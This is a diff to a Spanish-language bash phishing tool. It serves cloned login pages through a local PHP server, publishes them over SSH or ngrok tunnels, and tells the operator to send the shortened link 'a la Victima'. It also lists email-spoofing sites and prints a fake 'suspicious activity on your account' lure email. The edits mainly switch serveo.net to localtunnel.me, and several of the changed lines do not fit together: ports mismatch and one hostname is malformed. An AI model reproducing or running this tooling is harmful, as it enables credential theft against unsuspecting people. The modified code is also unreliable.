@@ -358,18 +358,16 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "Necesita SSH pero no está instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' .localtunnel.me 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.localtunnel.me" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s https://tinyurl.com/create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
@@ -449,18 +447,16 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor PHP...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:8000 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con localtunnel.me...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:8000/status | grep -o "https://[0-9a-z]*\.localtunnel.me")
 printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
@@ -482,7 +478,7 @@ printf "\n"
 printf "\e[1;93m\e[0m\e[1;92mPuedes escojer para el reenvio de puertos una de las opciones\e[0m \e[1;93m\e[0m\n"
 printf "\n"
 printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Tunelización SSH...)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m localtunnel.me (Tunelización SSH...)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
 default_option_server="1"
